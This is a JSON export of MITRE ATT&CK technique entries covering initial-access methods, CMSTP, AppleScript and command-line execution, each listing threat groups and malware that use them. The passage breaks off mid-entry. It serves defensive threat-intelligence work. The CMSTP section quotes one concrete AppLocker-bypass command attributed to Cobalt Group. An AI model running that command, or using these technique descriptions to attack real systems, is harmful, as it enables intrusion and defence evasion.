{
    "Enterprise": {
        "Drive-by Compromise": {
            "Name": "Drive-by Compromise",
            "Description": "A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is targeted for exploitation. This can happen in several ways, but there are a few main components: Multiple ways of delivering exploit code to a browser exist, including:A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, cross-site scripting.Malicious ads are paid for and served through legitimate ad providers.Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring. [1]Typical drive-by compromise process:A user visits a website that is used to host the adversary controlled content.Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.Upon finding a vulnerable version, exploit code is delivered to the browser.If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.In some cases a second visit to the website after the initial scan is required before exploit code is delivered.Unlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n",
            "ID": "T1189",
            "Tactic": "Initial Access",
            "Platform: ": "Windows, Linux, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Packet capture, Network device logs, Process use of network, Web proxy, Network intrusion detection system, SSL/TLS inspection",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets.[2]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has infected victims by tricking them into visiting compromised watering hole websites.[3]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.[4][5]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks.[6]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal leveraged a watering hole to serve up malicious code.[7]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 compromised legitimate organizations' websites to create watering holes to compromise victims.[8]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.[9][10][11]"
                },
                {
                    "Name": "KARAE",
                    "Description": "KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.[5]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group delivered RATANKBA to victims via a compromised legitimate website.[12]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer has infected victims using watering holes.[13]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork has used watering holes to deliver files with exploits to initial victims.[14][15]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins.[16]"
                },
                {
                    "Name": "POORAIM",
                    "Description": "POORAIM has been delivered through compromised sites acting as watering holes.[5]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has has extensively used strategic Web compromises to target victims.[17][18]"
                }
            ]
        },
        "Exploit Public-Facing Application": {
            "Name": "Exploit Public-Facing Application",
            "Description": "The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL) [1], standard services (like SMB [2] or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services. [3] Depending on the flaw being exploited this may include Exploitation for Defense Evasion.For websites and databases, the OWASP top 10 gives a good list of the top 10 most common web-based vulnerabilities. [4]\n",
            "ID": "T1190",
            "Tactic": "Initial Access",
            "Platform: ": "Linux, Windows, macOS",
            "Data Sources: ": "Packet capture, Web logs, Web application firewall logs, Application logs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Axiom",
                    "Description": "Axiom has been observed using SQL injection to gain access to systems.[5][6]"
                },
                {
                    "Name": "Havij",
                    "Description": "Havij is used to automate SQL injection.[7]"
                },
                {
                    "Name": "sqlmap",
                    "Description": "sqlmap can be used to automate exploitation of SQL injection vulnerabilities.[8]"
                }
            ]
        },
        "Hardware Additions": {
            "Name": "Hardware Additions",
            "Description": "Computer accessories, computers, or networking hardware may be introduced into a system as a vector to gain execution. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping [1], man-in-the middle encryption breaking [2], keystroke injection [3], kernel memory reading via DMA [4], adding new wireless access to an existing network [5], and others.\n",
            "ID": "T1200",
            "Tactic": "Initial Access",
            "Platform: ": "Windows, Linux, macOS",
            "Data Sources: ": "Asset management, Data loss prevention",
            "Version": "1.0"
        },
        "Replication Through Removable Media": {
            "Name": "Replication Through Removable Media",
            "Description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n",
            "ID": "T1091",
            "Tactic": "Lateral Movement, Initial Access",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Data loss prevention",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Agent.btz",
                    "Description": "Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[2]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.[3][2]"
                },
                {
                    "Name": "Darkhotel",
                    "Description": "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.[4]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky searches for removable media and duplicates itself onto it.[5]"
                },
                {
                    "Name": "Flame",
                    "Description": "Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using autorun functionality.[6]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 has functionality to copy itself to removable media.[7]"
                },
                {
                    "Name": "SHIPSHAPE",
                    "Description": "APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.[8]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger is capable of spreading to USB devices.[9]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.[10]"
                }
            ]
        },
        "Spearphishing Attachment": {
            "Name": "Spearphishing Attachment",
            "Description": "Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\n",
            "ID": "T1193",
            "Tactic": "Initial Access",
            "Platform: ": "Windows, macOS, Linux",
            "Data Sources: ": "File monitoring, Packet capture, Network intrusion detection system, Detonation chamber, Email gateway, Mail server",
            "CAPEC ID: ": "CAPEC-163",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 sent spearphishing emails containing malicious Microsoft Office attachments.[2][3][4][5]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 has used spearphishing with an attachment to deliver files with exploits to initial victims.[6]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 sends emails to victims with a malicious executable disguised as a document or spreadsheet displaying a fake icon.[7]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 delivers malware using spearphishing emails with malicious HWP attachments.[8][9]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims.[10]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.[11][12][13][14][15][16]"
                },
                {
                    "Name": "DarkHydrus",
                    "Description": "DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the \"attachedTemplate\" technique to load a template from a remote server.[17][18][19]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used spearphishing with Microsoft Office attachments to target victims.[20][21]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.[22][23]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.[24][25]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has distributed targeted emails containing Word documents with embedded malicious macros.[26][27][28]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group sent emails to victims with malicious Microsoft Office documents attached.[29]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.[30]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.[31]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound sent malicious attachments to victims over email, including an Excel spreadsheet containing macros to download Pupy.[32]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.[33][34][35]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.[36][37]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.[38][39]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims.[40][41][42][43]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector.[44]"
                },
                {
                    "Name": "Rancor",
                    "Description": "Rancor has attached a malicious document to an email to gain initial access.[45]"
                },
                {
                    "Name": "TA459",
                    "Description": "TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments.[46]"
                }
            ]
        },
        "Spearphishing Link": {
            "Name": "Spearphishing Link",
            "Description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons).\n",
            "ID": "T1192",
            "Tactic": "Initial Access",
            "Platform: ": "Windows, macOS, Linux",
            "Data Sources: ": "Packet capture, Web proxy, Email gateway, Detonation chamber, SSL/TLS inspection, DNS records, Mail server",
            "CAPEC ID: ": "CAPEC-163",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.[1]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.[2]"
                },
                {
                    "Name": "APT33",
                    "Description": "APT33 sent spear phishing emails containing links to .hta files.[3]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has sent emails with URLs pointing to malicious documents.[4]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.[5]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.[6][7]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has distributed targeted emails containing links to malicious documents with embedded macros.[8]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.[9]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.[10]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has sent spearphising emails with malicious links to potential victims.[11]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork has used spearphishing with links to deliver files with exploits to initial victims. The group has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.[12][13][14]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.[15]"
                }
            ]
        },
        "Spearphishing via Service": {
            "Name": "Spearphishing via Service",
            "Description": "Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.\n",
            "ID": "T1194",
            "Tactic": "Initial Access",
            "Platform: ": "Windows, macOS, Linux",
            "Data Sources: ": "SSL/TLS inspection, Anti-virus, Web proxy",
            "CAPEC ID: ": "CAPEC-163",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal spearphished victims via Facebook and Whatsapp.[1]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound used various social media channels to spearphish victims.[2]"
                }
            ]
        },
        "Supply Chain Compromise": {
            "Name": "Supply Chain Compromise",
            "Description": "Supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage of the supply chain including:Manipulation of development toolsManipulation of a development environmentManipulation of source code repositories (public or private)Manipulation of software update/distribution mechanismsCompromised/infected system images (multiple cases of removable media infected at the factory)Replacement of legitimate software with modified versionsSales of modified/counterfeit products to legitimate distributorsShipment interdictionWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. [1] [2] [3] Targeting may be specific to a desired victim set [4] or malicious software may be distributed to a broad set of consumers but only move on to additional tactics  on specific victims. [1] [3]\n",
            "ID": "T1195",
            "Tactic": "Initial Access",
            "Platform: ": "Linux, Windows, macOS",
            "Data Sources: ": "Web proxy, File monitoring",
            "CAPEC ID: ": "CAPEC-437, CAPEC-438, CAPEC-439",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "CCBkdr",
                    "Description": "CCBkdr was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.[5][6][1]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has targeted manufacturers in the supply chain for the defense industry.[4]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader was distributed through a compromised update to a Tor client with a coin miner payload.[2]"
                }
            ]
        },
        "Trusted Relationship": {
            "Name": "Trusted Relationship",
            "Description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\n",
            "ID": "T1199",
            "Tactic": "Initial Access",
            "Platform: ": "Linux, Windows, macOS",
            "Data Sources: ": "Application logs, Authentication logs, Third-party application logs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.[1]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.[2][3]"
                }
            ]
        },
        "Valid Accounts": {
            "Name": "Valid Accounts",
            "Description": "Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.Adversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful. The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. [1]\n",
            "ID": "T1078",
            "Tactic": "Defense Evasion, Persistence, Privilege Escalation, Initial Access",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator",
            "Effective Permissions: ": "User, Administrator",
            "Data Sources: ": "Authentication logs, Process monitoring",
            "Defense Bypassed: ": "Firewall, Host intrusion prevention systems, Network intrusion detection system, Process whitelisting, System access controls, Anti-virus",
            "CAPEC ID: ": "CAPEC-560",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT18",
                    "Description": "APT18 actors leverage legitimate credentials to log into external remote services.[2]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has used legitimate credentials to maintain access to a victim network and exfiltrate data. The group also used credentials stolen through a spearphishing email to login to the DCCC network.[3][4]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 leverages valid accounts after gaining credentials for use within the victim domain.[5]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has used legitimate local admin account credentials.[6]"
                },
                {
                    "Name": "APT33",
                    "Description": "APT33 has used valid accounts for privilege escalation.[7]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[8]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use known credentials to run commands and spawn processes as another user.[9]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 compromised user credentials and used valid accounts for operations.[10]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[11]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor. The group has also moved laterally using the Local Administrator account.[12]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[13][14][15]"
                },
                {
                    "Name": "FIN6",
                    "Description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.[16]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has utilized Valid Accounts during and.[17]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used valid, compromised email accounts for defense evasion, including to send malicious emails to other victim organizations.[18]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used valid accounts shared between Managed Service Providers and clients to move between the two environments.[19]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used compromised credentials to access other systems on a victim network.[20][21]"
                },
                {
                    "Name": "PittyTiger",
                    "Description": "PittyTiger attempts to obtain legitimate credentials during operations.[22]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[23]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.[24]"
                },
                {
                    "Name": "Suckfly",
                    "Description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[25]"
                },
                {
                    "Name": "Threat Group-1314",
                    "Description": "Threat Group-1314 actors used compromised credentials for the victim's endpoint management platform, Altiris, to move laterally.[26]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[27]"
                },
                {
                    "Name": "Umbreon",
                    "Description": "Umbreon creates valid users to provide access to the system.[28]"
                }
            ]
        },
        "AppleScript": {
            "Name": "AppleScript",
            "Description": "macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the osalang program.AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  [1]. Scripts can be run from the command-line via osascript /path/to/script or osascript -e \"script here\".\n",
            "ID": "T1155",
            "Tactic": "Execution, Lateral Movement",
            "Platform: ": "macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, System calls, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Dok",
                    "Description": "Dok uses AppleScript to create a login item for persistence.[2]"
                }
            ]
        },
        "CMSTP": {
            "Name": "CMSTP",
            "Description": "The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. [1] CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands. [2] Similar to Regsvr32 / \"Squiblydoo\", CMSTP.exe may be abused to load and execute DLLs [3]  and/or COM scriptlets (SCT) from remote servers. [4] [5] [6] This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. [3] [5] [6]\n",
            "ID": "T1191",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Process use of network, Windows event logs",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting, Anti-virus",
            "Contributors: ": "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank; Nik Seetharaman, Palantir",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.[7]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.[8]"
                }
            ]
        },
        "Command-Line Interface": {
            "Name": "Command-Line Interface",
            "Description": "Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. [1] One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task).Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.\n",
            "ID": "T1059",
            "Tactic": "Execution",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "4H RAT",
                    "Description": "4H RAT has the capability to create a remote shell.[2]"
                },
                {
                    "Name": "adbupd",
                    "Description": "adbupd can run a copy of cmd.exe.[3]"
                },
                {
                    "Name": "admin@338",
                    "Description": "Following exploitation with LOWBALL malware, admin@338 actors created a file containing a list of commands to be executed on the compromised computer.[4]"
                },
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can create a remote shell and run a given command.[5][6]"
                },
                {
                    "Name": "APT1",
                    "Description": "APT1 has used the Windows command shell to execute commands.[7]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 uses cmd.exe to execute commands.[8]"
                },
                {
                    "Name": "APT3",
                    "Description": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers.[9][10]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has used the command-line interface.[11][12]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "Adversaries can direct BACKSPACE to execute from the command-line on infected hosts, or have BACKSPACE create a reverse shell.[13]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS is capable of executing commands via cmd.exe.[14][15]"
                },
                {
                    "Name": "Bandook",
                    "Description": "Bandook is capable of spawning a Windows command shell.[16]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot uses the command-line interface to execute arbitrary commands.[17][18]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal can launch cmd.exe to execute commands on the system.[19]"
                },
                {
                    "Name": "BLACKCOFFEE",
                    "Description": "BLACKCOFFEE has the capability to create a reverse shell.[20]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER uses the command-line interface.[21]"
                },
                {
                    "Name": "CallMe",
                    "Description": "CallMe has the capability to create a reverse shell on victims.[22]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak has a command to create a reverse shell.[23]"
                },
                {
                    "Name": "Chaos",
                    "Description": "Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES.[24]"
                },
                {
                    "Name": "China Chopper",
                    "Description": "China Chopper is capable of opening a command terminal.[25]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK is capable of performing remote command execution.[26][5]"
                },
                {
                    "Name": "cmd",
                    "Description": "cmd is used to execute programs and other actions at the command-line interface.[27]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike uses a command-line interface to interact with systems.[28]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "A module in CozyCar allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe.[29]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf can execute shell commands.[30][21]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of creating a remote Bash shell and executing commands.[31][32]"
                },
                {
                    "Name": "Dipsind",
                    "Description": "Dipsind can spawn remote shells.[3]"
                },
                {
                    "Name": "DownPaper",
                    "Description": "DownPaper uses the command line.[33]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used command line for execution.[34]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary has the capability to create a remote shell and execute specified commands.[35]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus uses command line for execution.[36]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT opens a remote shell to execute commands on the infected system.[37]"
                },
                {
                    "Name": "FIN7",
